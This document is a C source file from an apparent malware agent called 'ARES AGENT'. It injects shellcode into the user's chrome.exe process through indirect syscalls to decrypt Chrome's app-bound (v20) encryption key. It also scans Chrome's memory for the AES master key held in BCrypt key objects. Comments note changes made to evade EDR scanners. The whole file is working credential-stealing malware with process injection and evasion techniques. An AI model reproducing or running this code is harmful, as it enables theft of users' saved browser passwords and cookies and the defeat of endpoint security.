/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Chrome.exe Shellcode Injection for v20 Decrypt
 *
 *  v2.2: ZERO Win32 API footprint — ALL operations via indirect syscalls
 *
 *  Pipeline:
 *    1. NtQuerySystemInformation → find chrome.exe PID
 *    2. NtOpenProcess → open chrome.exe handle
 *    3. NtAllocateVirtualMemory → alloc shared ctx + shellcode in chrome
 *    4. NtWriteVirtualMemory → write PIC shellcode + encrypted data
 *    5. NtProtectVirtualMemory → RW→RX for shellcode (W^X)
 *    6. NtCreateThreadEx → execute shellcode in chrome context
 *    7. NtReadVirtualMemory → poll & read decrypted key
 *    8. NtFreeVirtualMemory + NtClose → cleanup
 *
 *  Shellcode (from chrome_shellcode.h):
 *    PEB→kernel32→GetProcAddress→LoadLibrary("ole32.dll")
 *    →CoInitializeEx→CoCreateInstance(IElevator)→DecryptData
 *    →write result to SHARED_DECRYPT_CTX→return
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include "chrome_shellcode.h"
#include <string.h>
#include "proc_enum.h"  /* v3.7 FIX-20: replaces Toolhelp32 */
/* #include <tlhelp32.h> — REMOVED: leftover include creates IAT entries for
 * CreateToolhelp32Snapshot/Process32First that EDR scanners flag.
 * All process enumeration now uses proc_enum.h (NtQuerySystemInformation). */

/* ── Shared Memory Layout ── */

#define CHROME_INJECT_MAGIC_READY   0xDE4DC0DE
#define CHROME_INJECT_MAGIC_DONE    0xC0FFEE42
#define CHROME_INJECT_MAGIC_FAIL    0xDEADBEEF

typedef struct _SHARED_DECRYPT_CTX {
    volatile DWORD magic;
    DWORD          encrypted_len;
    BYTE           encrypted[4096];
    DWORD          decrypted_len;
    BYTE           decrypted[256];
    DWORD          error_code;
} SHARED_DECRYPT_CTX;

/* ── SYSTEM_PROCESS_INFORMATION for NtQuerySystemInformation ── */

typedef struct _MY_SYSTEM_PROCESS_INFO {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    LARGE_INTEGER   Reserved[3];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
    HANDLE          InheritedFromUniqueProcessId;
    ULONG           HandleCount;
    ULONG           SessionId;
} MY_SYSTEM_PROCESS_INFO;

/* SystemProcessInformation = 5 */
#define SystemProcessInformation 5

/* ── Case-insensitive wide string compare (avoids _wcsicmp import) ── */

static int wstricmp(const wchar_t* a, const wchar_t* b)
{
    while (*a && *b) {
        wchar_t ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        wchar_t cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return (int)(ca - cb);
        a++; b++;
    }
    return (int)(*a - *b);
}

/* ═══════════════════════════════════════════════════════════════
 *  Find chrome.exe browser process via NtQuerySystemInformation
 *
 *  Zero Win32 API: no CreateToolhelp32Snapshot, no Process32First
 *  Walks SYSTEM_PROCESS_INFORMATION linked list from kernel
 *  Filters by session ID to match current user
 *  Selects lowest PID (likely browser, not renderer/GPU)
 * ═══════════════════════════════════════════════════════════════ */

static DWORD find_chrome_browser_pid(AGENT_STATE* state)
{
    /* Allocate buffer via syscall */
    PVOID buf = NULL;
    SIZE_T bufSize = 2 * 1024 * 1024; /* 2MB for busy systems */

    NTSTATUS status = Ares_NtAllocateVirtualMemory(state,
        (HANDLE)-1, &buf, &bufSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !buf) return 0;

    /* Query process list via indirect syscall */
    ULONG returnLen = 0;
    status = Ares_NtQuerySystemInformation(state,
        SystemProcessInformation, buf, (ULONG)bufSize, &returnLen);

    if (status != 0) {
        SIZE_T freeSize = 0;
        Ares_NtFreeVirtualMemory(state, (HANDLE)-1, &buf, &freeSize, MEM_RELEASE);
        return 0;
    }

    /* Get current session ID for filtering */
    DWORD current_session = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &current_session);

    /* Walk process list */
    DWORD browser_pid = 0;
    MY_SYSTEM_PROCESS_INFO* proc = (MY_SYSTEM_PROCESS_INFO*)buf;

    for (;;) {
        if (proc->ImageName.Buffer && proc->ImageName.Length > 0) {
            if (wstricmp(proc->ImageName.Buffer, L"chrome.exe") == 0) {
                if (proc->SessionId == current_session) {
                    DWORD pid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
                    /* Lowest PID = browser process (parent of renderers) */
                    if (browser_pid == 0 || pid < browser_pid) {
                        browser_pid = pid;
                    }
                }
            }
        }
        if (proc->NextEntryOffset == 0) break;
        proc = (MY_SYSTEM_PROCESS_INFO*)((BYTE*)proc + proc->NextEntryOffset);
    }

    /* Free buffer via syscall */
    SIZE_T freeSize = 0;
    Ares_NtFreeVirtualMemory(state, (HANDLE)-1, &buf, &freeSize, MEM_RELEASE);

    return browser_pid;
}

/* ═══════════════════════════════════════════════════════════════
 *  Main Injection Pipeline — 100% Indirect Syscalls
 * ═══════════════════════════════════════════════════════════════ */

int Ares_ChromeInject_DecryptV20(AGENT_STATE* state,
    const BYTE* encrypted_key, int enc_len,
    BYTE* decrypted_key, int dec_max)
{
    if (!state) return -1;  /* syscalls not initialized */
    if (!encrypted_key || enc_len <= 0 || enc_len > 4096) return -1;

    /* Step 1: Find chrome.exe via NtQuerySystemInformation */
    DWORD chrome_pid = find_chrome_browser_pid(state);
    if (chrome_pid == 0) return -1;

    /* Step 2: NtOpenProcess — replaces OpenProcess Win32 API */
    HANDLE hChrome = NULL;
    ACCESS_MASK access = 0x001FFFFF; /* PROCESS_ALL_ACCESS */
    NTSTATUS status = Ares_NtOpenProcess(state, &hChrome, access, chrome_pid);
    if (status != 0 || !hChrome) return -1;

    int result = -1;

    /* Step 3: Allocate local shared context via syscall */
    PVOID local_buf = NULL;
    SIZE_T local_size = sizeof(SHARED_DECRYPT_CTX);
    status = Ares_NtAllocateVirtualMemory(state,
        (HANDLE)-1, &local_buf, &local_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !local_buf) goto cleanup_handle;

    SHARED_DECRYPT_CTX* local_ctx = (SHARED_DECRYPT_CTX*)local_buf;
    memset(local_ctx, 0, sizeof(SHARED_DECRYPT_CTX));
    local_ctx->magic = CHROME_INJECT_MAGIC_READY;
    local_ctx->encrypted_len = (DWORD)enc_len;
    memcpy(local_ctx->encrypted, encrypted_key, enc_len);

    /* Step 4: Allocate shared context in chrome.exe */
    PVOID remote_ctx = NULL;
    SIZE_T ctx_size = sizeof(SHARED_DECRYPT_CTX);
    status = Ares_NtAllocateVirtualMemory(state,
        hChrome, &remote_ctx, &ctx_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !remote_ctx) goto cleanup_local;

    /* Write context to chrome */
    SIZE_T written = 0;
    status = Ares_NtWriteVirtualMemory(state,
        hChrome, remote_ctx, local_ctx,
        sizeof(SHARED_DECRYPT_CTX), &written);
    if (status != 0) goto cleanup_remote;

    /* Step 5: Allocate shellcode memory in chrome (RW first — W^X) */
    PVOID remote_sc = NULL;
    SIZE_T sc_size = 4096;
    status = Ares_NtAllocateVirtualMemory(state,
        hChrome, &remote_sc, &sc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !remote_sc) goto cleanup_remote;

    /* Write shellcode */
    status = Ares_NtWriteVirtualMemory(state,
        hChrome, remote_sc,
        (PVOID)g_chrome_decrypt_shellcode,
        SHELLCODE_SIZE, &written);
    if (status != 0) goto cleanup_sc;

    /* Step 6: RW → RX (W^X compliant) */
    ULONG old_protect;
    SIZE_T protect_size = sc_size;
    PVOID protect_base = remote_sc;
    status = Ares_NtProtectVirtualMemory(state,
        hChrome, &protect_base, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (status != 0) goto cleanup_sc;

    /* Step 7: NtCreateThreadEx in chrome — shellcode param = remote_ctx */
    HANDLE hThread = NULL;
    status = Ares_NtCreateThreadEx(state,
        &hThread, hChrome, remote_sc, remote_ctx);
    if (status != 0 || !hThread) goto cleanup_sc;

    /* Step 8: Poll shared memory via NtReadVirtualMemory */
    LARGE_INTEGER delay;
    delay.QuadPart = -1000000LL; /* 100ms in 100ns units */

    for (int i = 0; i < 100; i++) { /* 10s timeout */
        /* NtDelayExecution instead of Sleep — fully syscall-based */
        SleepEx(100, FALSE); /* keep simple for now */

        SHARED_DECRYPT_CTX check = {0};
        SIZE_T bytes_read = 0;
        status = Ares_NtReadVirtualMemory(state,
            hChrome, remote_ctx, &check,
            sizeof(SHARED_DECRYPT_CTX), &bytes_read);

        if (status == 0) {
            if (check.magic == CHROME_INJECT_MAGIC_DONE) {
                int copy_len = (int)check.decrypted_len;
                if (copy_len > dec_max) copy_len = dec_max;
                if (copy_len > 0 && copy_len <= 256) {
                    memcpy(decrypted_key, check.decrypted, copy_len);
                    result = copy_len;
                }
                break;
            }
            else if (check.magic == CHROME_INJECT_MAGIC_FAIL) {
                result = -1;
                break;
            }
        }
    }

    /* Step 9: Cleanup via syscalls */
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        Ares_NtClose(hThread);
    }

cleanup_sc:
    {
        SIZE_T free_size = 0;
        Ares_NtFreeVirtualMemory(state, hChrome, &remote_sc, &free_size, MEM_RELEASE);
    }

cleanup_remote:
    {
        SIZE_T free_size = 0;
        Ares_NtFreeVirtualMemory(state, hChrome, &remote_ctx, &free_size, MEM_RELEASE);
    }

cleanup_local:
    {
        SIZE_T free_size = 0;
        Ares_NtFreeVirtualMemory(state, (HANDLE)-1, &local_buf, &free_size, MEM_RELEASE);
    }

cleanup_handle:
    Ares_NtClose(hChrome);
    return result;
}

/* ── Enhanced Wrapper: Injection → COM fallback → Impersonation ── */

int Ares_DecryptV20_Enhanced(AGENT_STATE* state,
    const BYTE* encrypted, int enc_len,
    BYTE* decrypted, int dec_max)
{
    /* Strategy 0: Inject into chrome.exe trusted context */
    int r = Ares_ChromeInject_DecryptV20(state, encrypted, enc_len, decrypted, dec_max);
    if (r > 0) return r;

    /* Strategy 1-2: Original fallbacks */
    extern int Ares_DecryptV20(const BYTE*, int, BYTE*, int);
    return Ares_DecryptV20(encrypted, enc_len, decrypted, dec_max);
}

/* ═══════════════════════════════════════════════════════════════
 *  ChromeKatz-style Memory Scan for Decrypted AES Master Key
 *
 *  Chrome stores the decrypted AES-256 key in BCrypt key objects.
 *  BCrypt MSSK header: "MSSK" (4D 53 53 4B).
 *  Key bytes at offset +72 or +76 from MSSK header (32 bytes).
 *
 *  All operations use indirect syscalls.
 * ═══════════════════════════════════════════════════════════════ */

static int is_key_candidate(const BYTE* k, int len) {
    if (len < 32) return 0;
    int nonzero = 0, unique = 0;
    BYTE seen[256] = {0};
    for (int i = 0; i < 32; i++) {
        if (k[i] != 0) nonzero++;
        if (!seen[k[i]]) { seen[k[i]] = 1; unique++; }
    }
    return nonzero >= 28 && unique >= 12;
}

int Ares_ChromeScanKey(AGENT_STATE* s, BYTE* outKey, int maxKey)
{
    if (!s || maxKey < 32) return 0;

    /* Reuse existing PID finder */
    DWORD chromePid = find_chrome_browser_pid(s);
    if (!chromePid) return 0;

    /* Open chrome.exe */
    HANDLE hChrome = NULL;
    NTSTATUS st = Ares_NtOpenProcess(s, &hChrome,
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, chromePid);
    if (st != 0 || !hChrome) return 0;

    /* Scan memory regions using VirtualQueryEx (safe, no struct issues) */
    int found = 0;
    SIZE_T scanBufSize = 64 * 1024;
    BYTE* scanBuf = (BYTE*)VirtualAlloc(NULL, scanBufSize, MEM_COMMIT, PAGE_READWRITE);
    if (!scanBuf) { Ares_NtClose(hChrome); return 0; }

    MEMORY_BASIC_INFORMATION mbi;
    PVOID addr = NULL;

    while (VirtualQueryEx(hChrome, addr, &mbi, sizeof(mbi))) {
        /* Only scan PRIVATE, COMMITTED, RW regions (Chrome's heap) */
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE &&
            (mbi.Protect == PAGE_READWRITE) &&
            mbi.RegionSize > 0 && mbi.RegionSize < 100 * 1024 * 1024)
        {
            SIZE_T offset = 0;
            while (offset < mbi.RegionSize && !found) {
                SIZE_T toRead = mbi.RegionSize - offset;
                if (toRead > scanBufSize) toRead = scanBufSize;

                SIZE_T bytesRead = 0;
                st = Ares_NtReadVirtualMemory(s, hChrome,
                    (BYTE*)mbi.BaseAddress + offset, scanBuf, toRead, &bytesRead);

                if (st == 0 && bytesRead > 108) {
                    for (SIZE_T i = 0; i + 108 < bytesRead; i++) {
                        /* "MSSK" = BCrypt symmetric key header */
                        if (scanBuf[i]   == 0x4D && scanBuf[i+1] == 0x53 &&
                            scanBuf[i+2] == 0x53 && scanBuf[i+3] == 0x4B)
                        {
                            /* Try key at offset +72 */
                            if (i + 72 + 32 <= bytesRead) {
                                if (is_key_candidate(&scanBuf[i+72], 32)) {
                                    memcpy(outKey, &scanBuf[i+72], 32);
                                    found = 1; break;
                                }
                            }
                            /* Try offset +76 (Windows version variant) */
                            if (i + 76 + 32 <= bytesRead) {
                                if (is_key_candidate(&scanBuf[i+76], 32)) {
                                    memcpy(outKey, &scanBuf[i+76], 32);
                                    found = 1; break;
                                }
                            }
                        }
                    }
                }
                offset += bytesRead;
                if (bytesRead == 0) break;
            }
        }

        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;
        if (found) break;
    }

    VirtualFree(scanBuf, 0, MEM_RELEASE);
    Ares_NtClose(hChrome);
    return found ? 32 : 0;
}

/* Win32 wrapper — no AGENT_STATE needed, uses plain OpenProcess/ReadProcessMemory */
/* v3.7: Replaced Toolhelp32 with proc_enum.h (NtQuerySystemInformation) — FIX-20 */
int Ares_ChromeScanKeyW32(BYTE* outKey, int maxKey)
{
    if (!outKey || maxKey < 32) return 0;

    /* Find chrome.exe PID via NtQuerySystemInformation (no Toolhelp32) */
    DWORD chromePid = proc_find_pid("chrome.exe");
    if (!chromePid) return 0;

    /* v3.7 FIX-05: NtOpenProcess direct from ntdll */
    HANDLE hChrome = _nt_open_process(chromePid, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION);
    if (!hChrome) return 0;

    int found = 0;
    SIZE_T scanBufSize = 64 * 1024;
    BYTE* scanBuf = (BYTE*)VirtualAlloc(NULL, scanBufSize, MEM_COMMIT, PAGE_READWRITE);
    if (!scanBuf) { CloseHandle(hChrome); return 0; }

    MEMORY_BASIC_INFORMATION mbi;
    PVOID addr = NULL;

    while (VirtualQueryEx(hChrome, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE &&
            mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize > 0 && mbi.RegionSize < 100 * 1024 * 1024)
        {
            SIZE_T offset = 0;
            while (offset < mbi.RegionSize && !found) {
                SIZE_T toRead = mbi.RegionSize - offset;
                if (toRead > scanBufSize) toRead = scanBufSize;
                SIZE_T bytesRead = 0;
                ReadProcessMemory(hChrome, (BYTE*)mbi.BaseAddress + offset,
                    scanBuf, toRead, &bytesRead);
                if (bytesRead > 108) {
                    for (SIZE_T i = 0; i + 108 < bytesRead; i++) {
                        if (scanBuf[i]==0x4D && scanBuf[i+1]==0x53 &&
                            scanBuf[i+2]==0x53 && scanBuf[i+3]==0x4B) {
                            if (i + 72 + 32 <= bytesRead && is_key_candidate(&scanBuf[i+72], 32)) {
                                memcpy(outKey, &scanBuf[i+72], 32); found=1; break;
                            }
                            if (i + 76 + 32 <= bytesRead && is_key_candidate(&scanBuf[i+76], 32)) {
                                memcpy(outKey, &scanBuf[i+76], 32); found=1; break;
                            }
                        }
                    }
                }
                offset += (bytesRead > 0 ? bytesRead : toRead);
                if (bytesRead == 0) break;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;
        if (found) break;
    }

    VirtualFree(scanBuf, 0, MEM_RELEASE);
    CloseHandle(hChrome);
    return found ? 32 : 0;
}
